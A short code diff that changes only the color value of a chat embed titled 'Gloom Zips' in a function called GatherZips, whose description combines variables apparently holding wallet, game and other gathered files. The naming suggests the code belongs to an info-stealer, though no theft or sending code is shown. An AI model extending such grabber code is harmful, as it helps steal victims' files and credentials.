@@ -1263,7 +1263,7 @@ def GatherZips(paths1, paths2, paths3):
             {
             "title": "Gloom Zips",
             "description": f"{wal}\n{ga}\n{ot}",
-            "color": 0818A8,
+            "color": 000000,
             "footer": {
                 "text": "crxelty#9999",
                 "icon_url": "https://static.vecteezy.com/system/resources/previews/002/871/079/non_2x/Gloom-logo-design-free-vector.jpg"
